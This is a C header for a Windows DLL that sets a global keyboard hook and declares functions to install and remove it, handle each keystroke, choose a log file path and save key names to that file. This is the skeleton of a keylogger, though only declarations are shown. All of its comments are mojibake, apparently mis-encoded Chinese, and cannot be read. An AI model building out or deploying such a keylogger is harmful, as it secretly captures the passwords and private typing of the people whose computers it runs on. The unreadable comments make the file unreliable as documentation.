#pragma once

#include <stdio.h>
#include <shlobj_core.h>
#include <Windows.h>

#ifdef EXPORTS
// ��������
#define DLL_API _declspec(dllexport)
#else 
// ���뺯��
#define DLL_API _declspec(dllimport)
#endif

HHOOK g_hook;
char LogFilePath[MAX_PATH];

// ��װ����
BOOL DLL_API InstallHook();

// ж�ع���
BOOL DLL_API UninstallHook();

// ���Ӵ�����
LRESULT CALLBACK keyboardProc(int code, WPARAM wParam, LPARAM lParam);

// �����ļ�����·��(��Ϊ���ڲ������Ա���������)
VOID SetSavePath(); 

// ���水����Ϣ
BOOL SaveKey(const char* KeyName);

// ��������
VOID ShowError(const char* FuncName);